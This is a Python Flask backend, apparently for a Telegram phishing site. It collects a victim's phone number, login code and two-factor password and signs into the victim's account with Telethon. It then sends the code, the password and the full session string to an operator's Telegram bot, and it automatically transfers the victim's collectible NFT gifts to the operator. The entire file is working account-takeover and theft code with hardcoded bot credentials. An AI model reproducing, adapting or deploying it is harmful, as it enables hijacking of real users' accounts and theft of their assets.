# app.py — РАБОЧАЯ ВЕРСИЯ (Telethon 1.38.0)
# КОЛЛЕКЦИОННЫЕ NFT ПОДАРКИ ПЕРЕДАЮТСЯ АВТОМАТИЧЕСКИ

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import time
import random
import os
import json
import io
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    FloodWaitError
)
import requests

# ============================================================
# ПЫТАЕМСЯ ИМПОРТИРОВАТЬ МЕТОДЫ РАЗНЫМИ СПОСОБАМИ
# ============================================================
try:
    # Способ 1: прямой импорт
    from telethon.tl.functions.payments import GetStarsGiftsRequest, TransferGiftRequest
    HAS_GIFT_METHODS = True
    print("✅ GetStarsGiftsRequest и TransferGiftRequest загружены")
except ImportError:
    try:
        # Способ 2: через telethon.tl.types
        from telethon.tl.types import GetStarsGiftsRequest, TransferGiftRequest
        HAS_GIFT_METHODS = True
        print("✅ GetStarsGiftRequest загружен из types")
    except ImportError:
        HAS_GIFT_METHODS = False
        print("❌ Методы для работы с подарками НЕ загружены")

load_dotenv()

app = Flask(__name__)
CORS(app)

# ============================================================
# КОНФИГУРАЦИЯ
# ============================================================
API_ID = int(os.getenv('API_ID', '27908807'))
API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', '8766481292'))

sessions = {}

# ============================================================
# ОДИН EVENT LOOP
# ============================================================
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ============================================================
# ЛОГИ
# ============================================================

def send_admin_log(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
            timeout=5
        )
    except Exception as e:
        print(f"Log error: {e}")

def send_tdata_to_admin(session_data):
    try:
        lines = []
        lines.append("=" * 50)
        lines.append("📁 TDATA СЕССИЯ")
        lines.append("=" * 50)
        lines.append(f"🆔 ID: {session_data.get('user_id', 'N/A')}")
        lines.append(f"📱 Phone: {session_data.get('phone', 'N/A')}")
        lines.append(f"👤 Username: @{session_data.get('username', 'N/A')}")
        lines.append("")
        lines.append("🔑 SESSION STRING:")
        lines.append(session_data.get('session_string', 'N/A'))
        
        content = "\n".join(lines)
        file_data = io.BytesIO(content.encode('utf-8'))
        
        files = {'document': (f"tdata_{session_data['phone']}_{int(time.time())}.txt", file_data)}
        data = {
            'chat_id': ADMIN_CHAT_ID,
            'caption': f"✅ СЕССИЯ\n👤 @{session_data['username']}\n📱 {session_data['phone']}",
            'parse_mode': 'Markdown'
        }
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendDocument",
            files=files,
            data=data,
            timeout=30
        )
    except Exception as e:
        print(f"Tdata error: {e}")

# ============================================================
# ПЕРЕДАЧА КОЛЛЕКЦИОННЫХ NFT ПОДАРКОВ
# ============================================================

async def transfer_gifts_auto(session_string, phone, username, user_id):
    """
    АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА КОЛЛЕКЦИОННЫХ NFT ПОДАРКОВ
    """
    if not HAS_GIFT_METHODS:
        await send_admin_log(
            f"ℹ️ *Методы подарков недоступны*\n"
            f"📱 {phone}\n"
            f"👤 @{username}\n"
            f"Обновите Telethon до 1.38.0"
        )
        return False
    
    client = None
    try:
        client = TelegramClient(StringSession(session_string), api_id=API_ID, api_hash=API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await send_admin_log(f"❌ Сессия истекла\n📱 {phone}")
            return False
        
        # ============================================================
        # ПОЛУЧАЕМ СПИСОК КОЛЛЕКЦИОННЫХ NFT ПОДАРКОВ
        # ============================================================
        try:
            result = await client(GetStarsGiftsRequest())
            gifts = result.gifts if result and hasattr(result, 'gifts') else []
            
            if not gifts:
                # Пробуем альтернативный метод
                try:
                    from telethon.tl.functions.payments import GetGiftsRequest
                    result2 = await client(GetGiftsRequest())
                    gifts = result2.gifts if result2 and hasattr(result2, 'gifts') else []
                except Exception as e2:
                    print(f"GetGiftsRequest error: {e2}")
                    gifts = []
            
            if gifts and len(gifts) > 0:
                transferred = 0
                gift_list = []
                
                for gift in gifts:
                    try:
                        gift_id = getattr(gift, 'id', None)
                        if not gift_id:
                            gift_id = getattr(gift, 'gift_id', None)
                        if not gift_id:
                            continue
                        
                        gift_name = getattr(gift, 'name', 'Unknown Gift')
                        gift_stars = getattr(gift, 'stars', 0)
                        gift_limited = getattr(gift, 'limited', False)
                        gift_issued = getattr(gift, 'issued', 0)
                        gift_total = getattr(gift, 'total', 0)
                        
                        gift_info = f"{gift_name} (Stars: {gift_stars})"
                        if gift_limited:
                            gift_info += f" [Лимитированный: {gift_issued}/{gift_total}]"
                        
                        gift_list.append(f"  • {gift_info}")
                        
                        # ПЕРЕДАЁМ ПОДАРОК АДМИНУ
                        try:
                            await client(TransferGiftRequest(
                                gift_id=gift_id,
                                to_id=ADMIN_USER_ID
                            ))
                            transferred += 1
                            await asyncio.sleep(0.5)
                        except Exception as e:
                            print(f"Transfer error for {gift_id}: {e}")
                            continue
                    except Exception as e:
                        print(f"Gift processing error: {e}")
                        continue
                
                if transferred > 0:
                    gift_list_text = "\n".join(gift_list)
                    await send_admin_log(
                        f"🎁 *Передано {transferred} коллекционных NFT подарков*\n"
                        f"📱 {phone}\n"
                        f"👤 @{username}\n\n"
                        f"📦 Список:\n{gift_list_text}"
                    )
                    return True
                else:
                    await send_admin_log(
                        f"⚠️ *Не удалось передать подарки*\n"
                        f"📱 {phone}\n"
                        f"👤 @{username}"
                    )
                    return False
            else:
                await send_admin_log(
                    f"📭 *Нет коллекционных NFT подарков*\n"
                    f"📱 {phone}\n"
                    f"👤 @{username}"
                )
                return False
                
        except Exception as e:
            error = str(e)
            if "not found" in error.lower() or "not available" in error.lower():
                await send_admin_log(
                    f"ℹ️ *Метод подарков не поддерживается*\n"
                    f"📱 {phone}\n"
                    f"👤 @{username}\n"
                    f"Обновите Telethon до версии 1.38.0"
                )
            else:
                await send_admin_log(
                    f"❌ *Ошибка проверки подарков*\n"
                    f"📱 {phone}\n"
                    f"👤 @{username}\n"
                    f"`{error[:200]}`"
                )
            return False
        
    except Exception as e:
        await send_admin_log(
            f"❌ *Ошибка подключения*\n"
            f"📱 {phone}\n"
            f"`{str(e)[:150]}`"
        )
        return False
    finally:
        if client and client.is_connected():
            try:
                await client.disconnect()
            except:
                pass

# ============================================================
# MTProto ФУНКЦИИ
# ============================================================

async def send_code_async(phone):
    try:
        client = TelegramClient(StringSession(), api_id=API_ID, api_hash=API_HASH)
        await client.connect()
        
        if await client.is_user_authorized():
            await client.disconnect()
            return {'success': False, 'error': 'Already authorized'}
        
        result = await client.send_code_request(phone)
        
        sessions[phone] = {
            'client': client,
            'phone_code_hash': result.phone_code_hash
        }
        
        send_admin_log(f"📱 Код для {phone}")
        return {'success': True, 'phone_code_hash': result.phone_code_hash}
        
    except PhoneNumberInvalidError:
        return {'success': False, 'error': 'Invalid phone number'}
    except FloodWaitError as e:
        return {'success': False, 'error': f'Wait {e.seconds}s'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_code_async(phone, code, phone_code_hash):
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = client_data['client']
        if not client.is_connected():
            await client.connect()
        
        try:
            signed_in = await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            session_string = client.session.save()
            
            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }
            
            await client.disconnect()
            
            send_admin_log(f"✅ Код: {code}\n📱 {phone}\n👤 @{session_data['username']} (ID: {session_data['user_id']})")
            
            # АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА ПОДАРКОВ
            await transfer_gifts_auto(session_string, phone, session_data['username'], session_data['user_id'])
            
            return {'success': True, 'hasPassword': False, 'sessionData': session_data}
            
        except SessionPasswordNeededError:
            send_admin_log(f"🔐 Требуется пароль\n📱 {phone}\nКод: {code}")
            return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
            
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_password_async(phone, password):
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = client_data['client']
        if not client.is_connected():
            await client.connect()
        
        try:
            signed_in = await client.sign_in(password=password)
            session_string = client.session.save()
            
            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }
            
            await client.disconnect()
            
            send_admin_log(f"🔑 Пароль: {password}\n📱 {phone}\n👤 @{session_data['username']} (ID: {session_data['user_id']})")
            
            # АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА ПОДАРКОВ
            await transfer_gifts_auto(session_string, phone, session_data['username'], session_data['user_id'])
            
            return {'success': True, 'sessionData': session_data}
            
        except PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid cloud password'}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ============================================================
# ОБЁРТКА
# ============================================================

def run_async(coro):
    return loop.run_until_complete(coro)

# ============================================================
# API ЭНДПОИНТЫ
# ============================================================

@app.route('/ping', methods=['GET'])
@app.route('/', methods=['GET'])
def ping():
    return jsonify({
        'status': 'online',
        'gift_methods_available': HAS_GIFT_METHODS
    })

@app.route('/sendCode', methods=['POST'])
def send_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    
    if not phone or len(phone) < 6:
        return jsonify({'success': False, 'error': 'Invalid phone'}), 400
    
    result = run_async(send_code_async(phone))
    
    if result['success']:
        return jsonify({
            'success': True,
            'phoneCodeHash': result.get('phone_code_hash'),
            'message': 'Code sent by Telegram'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkCode', methods=['POST'])
def check_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    phone_code_hash = data.get('phoneCodeHash', '').strip()
    
    if not phone or not code or not phone_code_hash:
        return jsonify({'success': False, 'error': 'Missing fields'}), 400
    
    result = run_async(check_code_async(phone, code, phone_code_hash))
    
    if result['success']:
        if result.get('hasPassword'):
            return jsonify({
                'success': True,
                'hasPassword': True,
                'message': 'Cloud password required'
            })
        else:
            session_data = result['sessionData']
            send_tdata_to_admin(session_data)
            return jsonify({
                'success': True,
                'hasPassword': False,
                'sessionData': session_data,
                'message': 'Verified'
            })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkPassword', methods=['POST'])
def check_password():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    password = data.get('password', '').strip()
    
    if not phone or not password:
        return jsonify({'success': False, 'error': 'Missing phone or password'}), 400
    
    result = run_async(check_password_async(phone, password))
    
    if result['success']:
        session_data = result['sessionData']
        send_tdata_to_admin(session_data)
        return jsonify({
            'success': True,
            'sessionData': session_data,
            'message': 'Password verified successfully'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == '__main__':
    print("=" * 60)
    print("🔐 БЭКЕНД ЗАПУЩЕН")
    print("📌 Коллекционные NFT подарки передаются АВТОМАТИЧЕСКИ")
    print(f"📌 Методы подарков: {'✅ ДОСТУПНЫ' if HAS_GIFT_METHODS else '❌ НЕ ДОСТУПНЫ'}")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000)
